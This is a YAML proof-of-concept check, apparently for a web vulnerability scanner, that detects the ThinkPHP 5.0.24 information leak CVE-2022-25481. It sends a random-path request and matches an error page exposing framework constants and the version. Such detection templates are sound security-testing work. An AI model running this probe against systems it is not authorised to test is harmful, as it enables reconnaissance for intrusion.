name: poc-yaml-thinkphp-cve-2022-25481-info-leak
manual: true
transport: http
set:
    s1: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?s={{s1}}
        expression: response.status == 404 && response.content_type.contains("text/html") && response.body.bcontains(b"<title>System Error</title>") && response.body.bcontains(b"<h3 class=\"subheading\">ThinkPHP Constants</h3>") && response.body.bcontains(b"<span>V5.0.24</span")
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/Lyther/VulnDiscover/blob/master/Web/ThinkPHP_InfoLeak.md
    vulnerability:
        id: CT-403903
        level: high
